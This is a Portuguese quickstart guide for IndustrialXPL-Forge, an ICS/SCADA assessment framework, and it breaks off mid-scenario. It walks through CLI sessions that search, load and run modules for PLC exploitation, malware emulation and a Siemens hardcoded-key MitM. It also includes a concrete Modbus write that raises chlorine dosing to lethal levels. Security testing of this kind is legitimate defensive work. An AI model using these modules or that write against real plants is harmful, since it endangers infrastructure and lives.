# Início Rápido

Este guia percorre uma sessão completa do IXF, do lançamento ao primeiro exploit real, cobrindo modo de simulação, carregamento de módulos, configuração de opções, o portão SafeMode/DestructiveMode, exploração CVE, varredura MITRE ATT&CK for ICS e geração de relatórios.

---

## Sumário

- [Passo 1: Iniciar o IXF](#passo-1-iniciar-o-ixf)
- [Passo 2: Explorar o Sistema de Ajuda](#passo-2-explorar-o-sistema-de-ajuda)
- [Passo 3: Ver Estatísticas e Cobertura](#passo-3-ver-estatísticas-e-cobertura)
- [Passo 4: Buscar Módulos](#passo-4-buscar-módulos)
- [Passo 5: Carregar um Módulo de Scanner](#passo-5-carregar-um-módulo-de-scanner)
- [Passo 6: Inspecionar Opções do Módulo](#passo-6-inspecionar-opções-do-módulo)
- [Passo 7: Configurar o Alvo](#passo-7-configurar-o-alvo)
- [Passo 8: Executar em Modo Simulação (Padrão — Seguro)](#passo-8-executar-em-modo-simulação-padrão--seguro)
- [Passo 9: Verificação de Conectividade com check()](#passo-9-verificação-de-conectividade-com-check)
- [Passo 10: Carregar um Exploit CVE](#passo-10-carregar-um-exploit-cve)
- [Passo 11: Usar Opções Globais com setg](#passo-11-usar-opções-globais-com-setg)
- [Passo 12: Execução ao Vivo (Apenas Laboratórios Autorizados)](#passo-12-execução-ao-vivo-apenas-laboratórios-autorizados)
- [Passo 13: Varredura MITRE ATT&CK for ICS](#passo-13-varredura-mitre-attck-for-ics)
- [Passo 14: Executar TTP Completo](#passo-14-executar-ttp-completo)
- [Passo 15: Descoberta de Rede OT](#passo-15-descoberta-de-rede-ot)
- [Passo 16: Análise SAST com LLM](#passo-16-análise-sast-com-llm)
- [Passo 17: Gerar Relatório de Assessment](#passo-17-gerar-relatório-de-assessment)
- [Passo 18: Assessment de Conformidade IEC 62443](#passo-18-assessment-de-conformidade-iec-62443)
- [Modo Não-Interativo (CLI Direto)](#modo-não-interativo-cli-direto)
- [Cenários de Sessão Completa](#cenários-de-sessão-completa)
- [Diagnósticos e Verificação de Ambiente](#diagnósticos-e-verificação-de-ambiente)

---

## Passo 1: Iniciar o IXF

Inicie o shell interativo com o comando `ixf`:

```
$ ixf
[*] Indexing modules…
[+] 976 modules indexed.

  ___           _           _       _  __  ______  _       ______
 |_ _|_ __   __| |_   _ ___| |_ _ __(_) \ \/ / _ \| |     |  ___|__  _ __ __ _  ___
  | || '_ \ / _` | | | / __| __| '__| |  \  /|  __/| |     | |_ / _ \| '__/ _` |/ _ \
  | || | | | (_| | |_| \__ \ |_| |  | |  /  \| |   | |___  |  _| (_) | | | (_| |  __/
 |___|_| |_|\__,_|\__,_|___/\__|_|  |_| /_/\_\_|   |_____| |_|  \___/|_|  \__, |\___|
                                                                              |___/
  IndustrialXPL-Forge v1.0.12 — OT/ICS/SCADA Security Assessment Framework
  Author: André Henrique (@mrhenrike) | União Geek | https://uniaogeek.com.br/
  Python-First. Pure Python — install with pip install industrialxpl-forge.
  Type 'help' for commands.  simulate=True by default (safe mode).

ixf >
```

**Indicadores importantes no banner:**
- `976 modules indexed` — contagem total de módulos carregados com sucesso
- `simulate=True by default (safe mode)` — confirma que o modo seguro está ativo

### Iniciar diretamente de um arquivo Python (para instalação do código-fonte)

```
$ python ixf.py
```

ou:

```
$ python -m industrialxpl
```

---

## Passo 2: Explorar o Sistema de Ajuda

O comando `help` mostra o menu de ajuda global quando nenhum módulo está carregado, ou o menu de ajuda específico do módulo quando um módulo está ativo.

### Ajuda global

```
ixf > help

IndustrialXPL-Forge (IXF) v1.0.12

GLOBAL COMMANDS:
  help                          Show this help menu
  use <module>                  Load a module (e.g. use scanners/ics/modbus_detect)
  search <term>                 Search modules by keyword, vendor, CVE, or protocol
  exec <shell_cmd>              Execute a shell command
  discover <CIDR>               Discover OT/ICS assets on a network
  exit                          Exit IXF

MODULE COMMANDS (after 'use'):
  run                           Execute the current module
  check                         Run check() only — read-only fingerprint
  back                          Deselect current module
  set <option> <value>          Set a module option (e.g. set target 192.168.1.1)
  setg <option> <value>         Set a global option (applies to all modules)
  unsetg <option>               Clear a global option
  show [info|options|devices]   Show module information

CVE COMMANDS:
  cve <CVE-ID>                  Load module for a specific CVE
  cve-scan <CIDR>               Discover assets and test all applicable CVEs
  report [json|html|markdown]   Generate assessment report for current session

MITRE ATT&CK FOR ICS COMMANDS:
  mitre <TID>                   Show modules covering a technique (e.g. mitre T0843)
  mitre-list [tactic]           List all techniques [filtered by tactic]
  mitre-scan <tactic|TID> <target>  Execute all modules for a tactic/technique
  mitre-all <target>            Execute all 79 MITRE ICS techniques (simulate default)
  mitre-coverage                Show coverage percentage per tactic
  mitre-report [json|html|layer] Generate MITRE report / ATT&CK Navigator JSON layer

TTP COMMANDS:
  ttp <TID> <target>            Execute all modules for a TTP-ID against target/CIDR
  ttp-check <TID> <target>      Run only check() — read-only, always safe
  ttp-simulate <TID> <target>   Force simulate mode — print payloads only, no send
  ttp-list [--tactic <name>]    List all TTP-IDs with module counts

ASSESSMENT:
  assess <module_path>          Run an assessment module

NSE:
  nse [install|list|status]     Manage IXF Nmap NSE scripts

STATISTICS:
  stats                         Show IXF module statistics and coverage summary
  vendors [filter]              List all OT/ICS vendors covered
  protocols                     List all OT/ICS protocols covered
  coverage                      Show MITRE ATT&CK for ICS coverage

LLM / SAST:
  llm-key <provider> <api_key>  Configure LLM API key for SAST analysis
  llm-status                    Show LLM provider status
  sast <path> [--mode <mode>]   Static analysis of PLC/RTU source code
```

### Ajuda de módulo (após carregar um módulo)

```
ixf > use scanners/ics/modbus_detect
[+] Module loaded: Modbus TCP Device Detect

ixf (Modbus TCP Device Detect) > help

MODULE COMMANDS:
  run                                 Execute the current module
  back                                Deselect the current module
  set <option> <value>                Set a module option
  setg <option> <value>               Set a global option
  unsetg <option>                     Clear a global option
  show [info|options|advanced|devices] Print module details
  check                               Fingerprint / vulnerability check (read-only)
```

---

## Passo 3: Ver Estatísticas e Cobertura

Antes de começar uma sessão de avaliação, verifique a cobertura disponível:

```
ixf > stats

  IXF Module Statistics
  ─────────────────────────────────────────────────────
  Category          Count    %
  cve                 412    42%
  exploits            287    29%
  scanners             98    10%
  assessment           89     9%
  creds                62     6%
  ...
  ─────────────────────────────────────────────────────
  Total: 976 módulos

  Vendors covered: 150 | Malware TTPs: 26
  MITRE ATT&CK for ICS: 12 táticas, 103 técnicas mapeadas
  PyPI: pip install industrialxpl-forge | GitHub: github.com/mrhenrike/IndustrialXPL-Forge
```

```
ixf > mitre-coverage

  IXF MITRE ATT&CK for ICS Coverage
  ─────────────────────────────────────────────────────────────────────────
  Tactic ID    Tactic                      Total TIDs  Covered  %
  TA0108       Initial Access                    9         9    100%
  TA0104       Execution                         9         8     88%
  TA0110       Persistence                       8         6     75%
  TA0111       Privilege Escalation              2         2    100%
  TA0103       Evasion                           5         4     80%
  TA0102       Discovery                        13        11     84%
  TA0109       Lateral Movement                  3         3    100%
  TA0100       Collection                        9         8     88%
  TA0101       Command and Control               3         3    100%
  TA0107       Inhibit Response Function        18        14     77%
  TA0106       Impair Process Control           11         9     81%
  TA0105       Impact                           11         8     72%
  ─────────────────────────────────────────────────────────────────────────
  TOTAL        —                               101        89     88%
```

---

## Passo 4: Buscar Módulos

Use `search` para encontrar módulos por palavra-chave, vendor, ID de CVE ou protocolo.

### Busca por protocolo

```
ixf > search modbus
[+] 52 module(s) found:
  use exploits/protocols/modbus/modbus_client
  use exploits/protocols/modbus/modbus_replay_attack
  use exploits/protocols/modbus/modbus_fc_abuse
  use exploits/protocols/modbus/modbus_write_coil
  use exploits/protocols/modbus/modbus_write_register
  use scanners/ics/modbus_detect
  use scanners/ics/modbus_device_fingerprint
  use cve/schneider/cve_2018_7789_modicon_modbus_dos
  use cve/malware/frostygoop_modbus_heating
  … e 43 mais. Refine sua busca.
```

### Busca por CVE específico

```
ixf > search CVE-2021-22681
[+] 1 module(s) found:
  use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
```

### Busca por vendor

```
ixf > search siemens
[+] 50 module(s) found:
  use cve/siemens/cve_2019_13945_simatic_s7_1200_xss
  use cve/siemens/cve_2019_19280_scalance_fw_upload
  use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
  use cve/siemens/cve_2022_38465_s7_1500_session_hijack
  use exploits/protocols/s7comm/s7comm_device_info
  use exploits/protocols/s7comm/s7comm_stop_cpu
  use exploits/protocols/s7comm_plus/s7comm_plus_scan
  use creds/siemens/simatic_default_creds
  use scanners/ics/s7_comm_scanner
  … e 41 mais.
```

### Busca por tipo de ataque

```
ixf > search default_creds
[+] 38 module(s) found:
  use creds/siemens/simatic_default_creds
  use creds/rockwell/plc_default_creds
  use creds/schneider/modicon_default_creds
  use creds/honeywell/experion_default_creds
  …

ixf > search malware
[+] 26 module(s) found:
  use cve/malware/frostygoop_modbus_heating
  use cve/malware/crashoverride_industroyer
  use cve/malware/triton_triconex_safety
  use cve/malware/industroyer2_iec104
  use cve/malware/pipedream_incontroller
  use cve/apt/sandworm_ukraine_2022
  …

ixf > search dnp3
[+] 18 module(s) found:
  use exploits/protocols/dnp3/dnp3_request_flood
  use exploits/protocols/dnp3/dnp3_unsolicited_response
  use scanners/ics/dnp3_detect
  use assessment/protocols/dnp3_security_audit
  …
```

### Busca por setor industrial

```
ixf > search water
[+] 12 module(s) found:
  use cve/unitronics/cve_2023_6448_vision_default_password
  use assessment/sast/sast_examples/water_treatment_chemical_dosing
  …

ixf > search energy
[+] 8 module(s) found:
  use cve/malware/industroyer2_iec104
  use exploits/protocols/iec104/iec104_asdu_command
  …
```

---

## Passo 5: Carregar um Módulo de Scanner

Use `use` seguido do caminho do módulo (com barras ou pontos):

```
ixf > use scanners/ics/modbus_detect
[+] Module loaded: Modbus TCP Device Detect
[*] CVE: N/A | CVSS: N/A | Impact: LOW

ixf (Modbus TCP Device Detect) >
```

O prompt muda para incluir o nome do módulo entre parênteses, confirmando que um módulo está ativo.

### Notação alternativa (pontos)

```
ixf > use scanners.ics.modbus_detect
[+] Module loaded: Modbus TCP Device Detect
```

### Carregar via cve-id diretamente

```
ixf > cve CVE-2021-22681
[+] Module loaded: CVE-2021-22681 Siemens S7-1200/1500 PLC
[*] CVE: CVE-2021-22681 | CVSS: 9.8 | Impact: CRITICAL

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) >
```

---

## Passo 6: Inspecionar Opções do Módulo

```
ixf (Modbus TCP Device Detect) > show options

     Opções — Modbus TCP Device Detect
+------------+-----------+----------+-------------------------------------------+
| Opção      | Valor     | Obrig.   | Descrição                                 |
|------------|-----------|----------|-------------------------------------------|
| target     |           | sim      | IP ou hostname alvo                       |
| port       | 502       | não      | Porta Modbus TCP (padrão: 502)            |
| unit_id    | 1         | não      | ID de unidade Modbus (1-247)              |
| timeout    | 5         | não      | Timeout de conexão em segundos            |
| simulate   | True      | não      | Modo simulação (padrão: True, seguro)     |
| destructive| False     | não      | Habilitar envio real de pacotes           |
+------------+-----------+----------+-------------------------------------------+
```

### Ver informações detalhadas do módulo

```
ixf (Modbus TCP Device Detect) > show info

  Module Information — Modbus TCP Device Detect
  ─────────────────────────────────────────────────────────────
  name             : Modbus TCP Device Detect
  description      : Sonda de detecção Modbus TCP. Envia Function Code 4 e verifica
                     o echo do Transaction ID para confirmar presença de dispositivo Modbus.
  authors          : André Henrique (mrhenrike)
  references       : https://www.modbus.org/specs.php
  devices          : Qualquer dispositivo Modbus TCP
  impact           : LOW
  exploit_type     : Scanner / Fingerprinting
  cve              : N/A
  cvss             : N/A
  severity         : LOW
  mitre_techniques : T0888
  mitre_tactics    : Discovery
```

### Ver opções avançadas

```
ixf (Modbus TCP Device Detect) > show advanced

     Opções Avançadas — Modbus TCP Device Detect
+---------------+-------+--------+----------------------------------------------+
| Opção         | Valor | Req.   | Descrição                                    |
|---------------|-------|--------|----------------------------------------------|
| verbose       | False | não    | Exibir bytes raw da resposta                 |
| retry         | 2     | não    | Tentativas de reconexão em timeout           |
| thread_count  | 1     | não    | Threads para varredura multi-alvo            |
+---------------+-------+--------+----------------------------------------------+
```

### Ver dispositivos alvo

```
ixf (Modbus TCP Device Detect) > show devices

  Devices: Qualquer dispositivo com porta Modbus TCP aberta (502/TCP)
  Exemplos: Schneider Electric Modicon, Siemens ET200, Rockwell MicroLogix,
            GE Fanuc RX3i, ABB AC500, Mitsubishi MELSEC, e outros.
```

---

## Passo 7: Configurar o Alvo

```
ixf (Modbus TCP Device Detect) > set target 192.168.1.100
[+] target => 192.168.1.100

ixf (Modbus TCP Device Detect) > set port 502
[+] port => 502

ixf (Modbus TCP Device Detect) > set timeout 10
[+] timeout => 10
```

### Verificar configuração atual

```
ixf (Modbus TCP Device Detect) > show options

     Opções — Modbus TCP Device Detect
+------------+-----------------+----------+-------------------------------------------+
| Opção      | Valor           | Obrig.   | Descrição                                 |
|------------|-----------------|----------|-------------------------------------------|
| target     | 192.168.1.100   | sim      | IP ou hostname alvo                       |
| port       | 502             | não      | Porta Modbus TCP (padrão: 502)            |
| unit_id    | 1               | não      | ID de unidade Modbus (1-247)              |
| timeout    | 10              | não      | Timeout de conexão em segundos            |
| simulate   | True            | não      | Modo simulação (padrão: True, seguro)     |
| destructive| False           | não      | Habilitar envio real de pacotes           |
+------------+-----------------+----------+-------------------------------------------+
```

### Erros de validação de opção

O IXF valida os valores das opções antes de aceitá-los:

```
ixf (Modbus TCP Device Detect) > set port 99999
[-] Cannot set 'port': Porta deve estar entre 1 e 65535

ixf (Modbus TCP Device Detect) > set target não_e_ip_valido
[-] Cannot set 'target': Endereço IP ou hostname inválido

ixf (Modbus TCP Device Detect) > set unit_id 300
[-] Cannot set 'unit_id': Valor deve estar entre 1 e 247
```

---

## Passo 8: Executar em Modo Simulação (Padrão — Seguro)

Com `simulate=True` (padrão), `run` imprime **exatamente o que o módulo faria** sem enviar nenhum pacote à rede:

```
ixf (Modbus TCP Device Detect) > run

[*] Running Modbus TCP Device Detect in SIMULATE mode…

  [SIMULATE MODE — nenhum pacote enviado]
  ─────────────────────────────────────────────────────────────
  [i] O que aconteceria:
      Enviar probe Modbus Function Code 4 (Read Input Registers) para 192.168.1.100:502
      Frame (hex): 00 01 00 00 00 06 01 04 00 00 00 01
        TransactionID: 0x0001
        ProtocolID:    0x0000 (Modbus)
        Length:        0x0006
        UnitID:        0x01
        FunctionCode:  0x04 (Read Input Registers)
        StartAddr:     0x0000
        Quantity:      0x0001

      Verificar echo do Transaction ID na resposta para confirmar dispositivo Modbus ativo.

  [i] MITRE ATT&CK for ICS: T0888 (Remote System Discovery)
  [i] Para executar ao vivo: set simulate false
```

O modo de simulação é ideal para:
- **Treinamento de detecção SIEM/IDS**: acionar regras de detecção sem impactar o sistema alvo
- **Documentação de avaliação**: registrar o que seria executado sem risco operacional
- **Preparação de laboratório**: verificar a lógica do módulo antes da execução ao vivo

---

## Passo 9: Verificação de Conectividade com check()

`check()` realiza uma sonda TCP somente leitura **independentemente do modo simulate**. Ele não altera estado no dispositivo alvo.

```
ixf (Modbus TCP Device Detect) > check
[*] Checking Modbus TCP Device Detect…
[*] Verificando 192.168.1.100:502...
[+] VULNERABLE — Modbus TCP Device Detect
```

Se o dispositivo não estiver acessível:

```
ixf (Modbus TCP Device Detect) > check
[*] Checking Modbus TCP Device Detect…
[i] NOT_VULNERABLE — Modbus TCP Device Detect
```

`check()` é o passo recomendado antes de qualquer execução ao vivo — confirma que o alvo está acessível e exibe uma resposta ao probe.

---

## Passo 10: Carregar um Exploit CVE

### Voltar ao contexto global

```
ixf (Modbus TCP Device Detect) > back
[i] Module deselected.

ixf >
```

### Carregar CVE de alta severidade — Siemens S7

```
ixf > use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key

[+] Module loaded: CVE-2021-22681 Siemens S7-1200/1500 PLC
[*] CVE: CVE-2021-22681 | CVSS: 9.8 | Impact: CRITICAL

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) >
```

### Ver informações do CVE

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > show info

  Module Information
  ─────────────────────────────────────────────────────────────
  name             : CVE-2021-22681 Siemens S7-1200/1500 PLC
  description      : Siemens S7-1200 e S7-1500 CLPs contêm uma chave TLS hardcoded
                     no firmware que permite a qualquer atacante na rede realizar MitM
                     no protocolo S7comm+ (TCP/102) e descriptografar ou forjar
                     comandos autenticados para ler/escrever memória do CLP.
  authors          : André Henrique (mrhenrike)
  references       : https://cert-portal.siemens.com/productcert/pdf/ssa-731239.pdf
  devices          : Siemens S7-1200 (todas as versões < V4.6), S7-1500 (< V2.9.2)
  impact           : CRITICAL
  exploit_type     : Chave Hardcoded / Man-in-the-Middle
  cve              : CVE-2021-22681
  cvss             : 9.8
  severity         : CRITICAL
  mitre_techniques : T0843, T0859, T0813
  mitre_tactics    : Execution, Credential Access
```

### Definir alvo e executar em simulação

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set target 192.168.1.50
[+] target => 192.168.1.50

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > run

[*] Running CVE-2021-22681 Siemens S7-1200/1500 PLC in SIMULATE mode…

  [SIMULATE MODE — nenhum pacote enviado]
  ─────────────────────────────────────────────────────────────
  [i] O que aconteceria:
      CVE-2021-22681 Siemens S7-1200/1500 PLC
      CVSS 9.8 (CRITICAL) | Chave TLS hardcoded — MitM/Descriptografia S7comm+

      Passo 1: Extrair chave privada TLS hardcoded do firmware S7-1200
               (presente em todas as versões < V4.6)
      Passo 2: Posicionar-se na rede para MitM no TCP/102 (S7comm+)
               Técnica: ARP poisoning, PROFINET DCP replay, ou roteamento estático
      Passo 3: Descriptografar todo o tráfego S7comm+ usando a chave extraída
               Inclui: autenticação, upload/download de programa, leitura de memória
      Passo 4: Forjar comandos S7comm+ autenticados para:
               - Ler/escrever áreas de memória (DB, MB, IB, QB)
               - Iniciar/parar CPU do CLP
               - Fazer upload do programa PLC
               - Modificar configuração de hardware
      Impacto: Comprometimento completo de CLPs Siemens S7-1200/1500 em produção

  [i] MITRE ATT&CK for ICS: T0843 (Program Download), T0859 (Valid Accounts), T0813 (Denial of Control)
  [i] Para executar ao vivo: set simulate false + set destructive true
```

---

## Passo 11: Usar Opções Globais com setg

`setg` define uma opção que persiste em todos os módulos carregados durante a sessão. Elimina a necessidade de repetir `set target` para cada módulo.

```
ixf > setg target 192.168.1.100
[+] [global] target => 192.168.1.100

ixf > setg simulate true
[+] [global] simulate => true

ixf > use scanners/ics/modbus_detect
[+] Module loaded: Modbus TCP Device Detect
# target já está definido como 192.168.1.100 automaticamente

ixf (Modbus TCP Device Detect) > show options
+------------+-----------------+----------+-------------------------------------------+
| Opção      | Valor           | Obrig.   | Descrição                                 |
|------------|-----------------|----------|-------------------------------------------|
| target     | 192.168.1.100   | sim      | IP ou hostname alvo                       |
…

ixf (Modbus TCP Device Detect) > back
ixf > use scanners/ics/s7_comm_scanner
[+] Module loaded: Siemens S7 Communication Scanner
# target já está 192.168.1.100 automaticamente

ixf (Siemens S7 Communication Scanner) > run
# Executa com o alvo global já configurado
```

### Limpar uma opção global

```
ixf > unsetg target
[+] [global] target cleared.
```

---

## Passo 12: Execução ao Vivo (Apenas Laboratórios Autorizados)

> **Aviso Legal:** Execute somente em sistemas de sua propriedade ou com autorização escrita explícita. A execução não autorizada é ilegal e pode causar danos irreversíveis a sistemas industriais.

Para executar ao vivo, desative o modo simulate e habilite o modo destrutivo:

```
ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set simulate false
[+] simulate => False

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > set destructive true
[+] destructive => True

ixf (CVE-2021-22681 Siemens S7-1200/1500 PLC) > run
```

O DestructiveGate exibe um banner de aviso e aguarda confirmação explícita:

```
  ████████████████████████████████████████████████████████████
  ██  MODO DESTRUTIVO — IMPACTO CRÍTICO                      ██
  ████████████████████████████████████████████████████████████

  Módulo:  CVE-2021-22681 Siemens S7-1200/1500 PLC
  Alvo:    192.168.1.50:102
  Impacto: CRITICAL — Modificação de firmware. PODE SER IRREVERSÍVEL.

  Esta operação pode modificar ou parar um CLP Siemens S7-1200/1500
  em produção. O impacto pode ser irreversível sem acesso físico ao
  dispositivo.

  Digite EXATAMENTE a seguinte string para confirmar:
  I ACCEPT FULL RESPONSIBILITY FOR THIS DESTRUCTIVE OPERATION

  Confirmação> I ACCEPT FULL RESPONSIBILITY FOR THIS DESTRUCTIVE OPERATION
[+] Confirmado. Entrada de auditoria gravada. Executando...
[*] [CVE-2021-22681] Conectando a 192.168.1.50:102 (S7comm+)...
[+] Conexão S7comm+ estabelecida
[*] Tentando MitM com chave TLS hardcoded...
[+] Descriptografia S7comm+ bem-sucedida — chave hardcoded confirmada
[+] VULNERÁVEL — CVE-2021-22681 confirmado em 192.168.1.50
```

Para abortar, qualquer entrada diferente da string exata:

```
  Confirmação> sim
[-] ABORTADO. Entrada de auditoria gravada.
```

---

## Passo 13: Varredura MITRE ATT&CK for ICS

### Listar todas as técnicas mapeadas

```
ixf > mitre-list

  MITRE ATT&CK for ICS
  ─────────────────────────────────────────────────────────────
  TID     # Modules  Primary Module
  T0800   3          exploits/protocols/modbus/modbus_write_coil
  T0801   2          assessment/mitre_ics/t0801_monitor_process_state
  T0802   5          scanners/ics/modbus_detect
  T0803   4          exploits/protocols/s7comm/s7comm_block_read
  …
  T0843   12         cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
  T0880   8          assessment/mitre_ics/t0880_modify_alarm_settings
  …
```

### Filtrar por tática

```
ixf > mitre-list discovery

  MITRE ATT&CK for ICS — discovery
  ─────────────────────────────────────────────────────────────
  TID     # Modules  Primary Module
  T0840   5          scanners/ics/network_connection_enumeration
  T0842   3          scanners/ics/remote_system_info_discovery
  T0846   8          scanners/ics/modbus_detect
  T0888   9          scanners/ics/s7_comm_scanner
  …
```

### Varrer uma tática específica

```
ixf > mitre-scan discovery 192.168.1.0/24
[*] Varrendo tática: Discovery (TA0102) em 192.168.1.0/24
[*] simulate=True (modo seguro)
[*] [1/11] T0840 — Network Connection Enumeration
[*] [2/11] T0842 — Remote System Information Discovery
[*] [3/11] T0846 — Remote System Discovery
[*] [4/11] T0888 — Remote System Discovery (Protocol-Specific)
[*] [5/11] T0887 — Wireless Sniffing
…
[+] Varredura concluída: 11 técnicas, 34 execuções de módulo — 3 possíveis matches
```

### Varrer uma técnica específica

```
ixf > mitre-scan T0843 192.168.1.100
[*] Varrendo técnica: T0843 (Program Download) em 192.168.1.100
[*] simulate=True
[*] [1/12] cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
[*] [2/12] cve/rockwell/cve_2022_1161_controllogix_modified_fw
…
[+] T0843 concluída: 12 módulos, 0 erros
```

### Ver módulos para uma técnica

```
ixf > mitre T0843
[+] 12 module(s) cover T0843:
  use cve/siemens/cve_2021_22681_s7_1200_hardcoded_key
  use cve/rockwell/cve_2022_1161_controllogix_modified_fw
  use exploits/protocols/s7comm/s7comm_program_download
  use assessment/mitre_ics/t0843_program_upload
  …
```

---

## Passo 14: Executar TTP Completo

### Execução básica de TTP

```
ixf > ttp T0843 192.168.1.100
[*] TTP T0843 (Program Download) — 12 módulos — simulate=True
[*] [1/12] cve/siemens/cve_2021_22681_s7_1200_hardcoded_key ... OK
[*] [2/12] cve/rockwell/cve_2022_1161_controllogix_modified_fw ... OK
[*] [3/12] exploits/protocols/s7comm/s7comm_program_download ... OK
[*] [4/12] assessment/mitre_ics/t0843_program_upload ... OK
…
[+] Varredura T0843 concluída: 12 módulos, 0 erros, 0 vulnerabilidades confirmadas (simulate)
```

### TTP com parada no primeiro resultado

```
ixf > ttp T0859 192.168.1.100 --stop-on-first
[*] TTP T0859 (Valid Accounts) — 15 módulos — simulate=True — stop-on-first
[*] [1/15] creds/siemens/simatic_default_creds ... OK
[*] [2/15] creds/rockwell/plc_default_creds ... OK
[+] Hit encontrado! Parando varredura (--stop-on-first).
```

### TTP com limitação de taxa

```
ixf > ttp T0836 10.0.0.0/24 --rate-limit 1000
[*] TTP T0836 (Modify Parameter) — varredura de sub-rede 10.0.0.0/24 — 1000ms entre módulos
```

### TTP com saída para arquivo

```
ixf > ttp T0866 192.168.1.100 --output /opt/resultados/t0866_scan.json
[*] TTP T0866 (Exploitation of Remote Services) — 8 módulos
…
[+] Resultados salvos em /opt/resultados/t0866_scan.json
```

### TTP somente check() (somente leitura)

```
ixf > ttp-check T0843 192.168.1.100
[*] T0843 check-only (sem payloads destrutivos)
[*] [1/12] cve/siemens/cve_2021_22681_s7_1200_hardcoded_key — check(): NOT_VULNERABLE
[*] [2/12] cve/rockwell/cve_2022_1161_controllogix_modified_fw — check(): NOT_VULNERABLE
…
```

---

## Passo 15: Descoberta de Rede OT

### Descoberta básica de sub-rede

```
ixf > discover 192.168.1.0/24
[*] Discovering OT/ICS assets on 192.168.1.0/24…
[*] Module loaded: Modbus TCP Device Detect
[i] Set target to each host in 192.168.1.0/24 and run check().
[i] For automated CIDR sweep: ixf > ttp T0846.001 192.168.1.0/24
```

### Varredura MITRE de descoberta em sub-rede

```
ixf > mitre-scan discovery 192.168.1.0/24
[*] Varrendo tática: Discovery (TA0102) em 192.168.1.0/24
[*] Protocolos varridos: Modbus (502), S7comm (102), EtherNet/IP (44818),
    DNP3 (20000), BACnet (47808), OPC UA (4840), IEC 104 (2404)…
[+] 3 dispositivos OT encontrados:
    192.168.1.10  — Modbus TCP (Schneider Modicon)
    192.168.1.20  — S7comm (Siemens S7-1200)
    192.168.1.30  — BACnet/IP (Johnson Controls)
```

### CVE Scan em sub-rede

```
ixf > cve-scan 192.168.1.0/24
[*] [cve-scan] Discovery + CVE testing on 192.168.1.0/24…
[i] Feature: auto-fingerprint each host then run applicable CVE modules.
[i] Use mitre-scan discovery 192.168.1.0/24 to start with passive scanning.
```

---

## Passo 16: Análise SAST com LLM

### Configurar chave LLM

```
ixf > llm-key gemini AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[+] LLM key configured: provider=gemini len=39

ixf > llm-status

  Providers LLM
  ─────────────────────────────────────────────────────────────
  Provider     Status
  openai       não configurado
  anthropic    não configurado
  gemini       configurado
  deepseek     não configurado
  grok         não configurado
  ─────────────────────────────────────────────────────────────
  Ativo: gemini
```

### Executar SAST em código PLC

```
ixf > sast industrialxpl/resources/sast_examples/water_treatment_chemical_dosing.st
[*] Alvo: water_treatment_chemical_dosing.st (1 arquivo, 89 linhas)
[*] Linguagens: ST (1)
[*] Provider: gemini | Sanitizado: 0 credenciais, 0 IPs públicos
[*] Enviando 3,2 KB ao LLM (sanitizado)...

  RELATÓRIO DE ANÁLISE SAST
  ═══════════════════════════════════════════════════════════════

  FINDING [SEVERITY: CRITICAL]: Setpoint de Dosagem de Cloro Não Validado
    Localização: water_treatment_chemical_dosing.st, linha 48
    Descrição: SP_CHLORINE_HIGH := 4000.0 — 2000x o limite seguro da OMS (2 mg/L)
    Vetor de Ataque: Escrita FC16 Modbus em HR[200] (DOSE_FACTOR)
    Impacto Físico: 4000 mg/L de cloro — dose letal para crianças
    MITRE ATT&CK for ICS: T0836 (Modify Parameter), T0880 (Modify Alarm Settings)
    Exploit: modbus_write_register(unit=1, address=200, value=2000)
    Remediação: Validar DOSE_FACTOR <= 2.0; adicionar intertravamento físico redundante

  FINDING [SEVERITY: HIGH]: Sistema de Alarme Desabilitado via Flag de Manutenção
    Localização: water_treatment_chemical_dosing.st, linha 23
    Descrição: IF Maintenance_Mode THEN alarm_ack := TRUE; — alarmes silenciados
    …

  RESUMO: 2 CRITICAL, 3 HIGH, 1 MEDIUM, 0 LOW
```

---

## Passo 17: Gerar Relatório de Assessment

### Formatos disponíveis

```
ixf > report json
[+] Report generated: ixf_report_20260601_203045.json

ixf > report html
[+] Report generated: ixf_report_20260601_203101.html

ixf > report markdown
[+] Report generated: ixf_report_20260601_203115.md
```

### Relatório MITRE Navigator Layer

```
ixf > mitre-report layer
[+] MITRE report generated: ixf_mitre_layer_20260601_203130.json
[i] Abrir em: https://mitre-attack.github.io/attack-navigator/
[i] Importar o arquivo JSON para visualizar a cobertura de técnicas.

ixf > mitre-report html
[+] MITRE report generated: ixf_mitre_report_20260601_203145.html
```

---

## Passo 18: Assessment de Conformidade IEC 62443

```
ixf > assess iec62443/zone_conduit_audit
[*] Executando Auditoria de Zonas e Condutos IEC 62443...

  Auditoria de Zonas e Condutos IEC 62443
  ──────────────────────────────────────────────────────────────────
  Verificação                              Resultado  Notas
  Separação IT/OT                          MANUAL     Verificar regras de firewall Nível 3→2
  Whitelist de protocolos                  MANUAL     Apenas protocolos OT na zona ICS
  Autenticação de acesso remoto            MANUAL     MFA VPN obrigatório para zonas OT
  Servidor jump / DMZ                      MANUAL     Historian na DMZ, não diretamente no OT
  Documentação de zonas/condutos           MANUAL     Zonas definidas no plano de segurança
  ──────────────────────────────────────────────────────────────────
  [i] IEC 62443-3-3: Requisitos de baseline do Nível de Segurança SL2
```

```
ixf > assess nist_sp800_82/control_checklist
ixf > assess risk/ics_risk_scorer
ixf > report html
```

---

## Modo Não-Interativo (CLI Direto)

O IXF também pode ser usado sem o shell interativo, passando comandos diretamente:

```bash
# Buscar módulos
ixf search modbus

# Carregar módulo, definir alvo e executar em uma linha
ixf use scanners/ics/modbus_detect set target 192.168.1.100 run

# Somente check() (somente leitura)
ixf use scanners/ics/modbus_detect set target 192.168.1.100 check

# Varredura TTP
ixf ttp T0843 192.168.1.100

# Cobertura MITRE
ixf mitre-coverage

# Gerar relatório
ixf report json

# Estatísticas
ixf stats
```

---

## Cenários de Sessão Completa

### Cenário 1: Avaliação de segurança de rede SCADA water utility

```
ixf > setg target 10.0.1.100
ixf > setg simulate true
ixf > use scanners/ics/modbus_detect
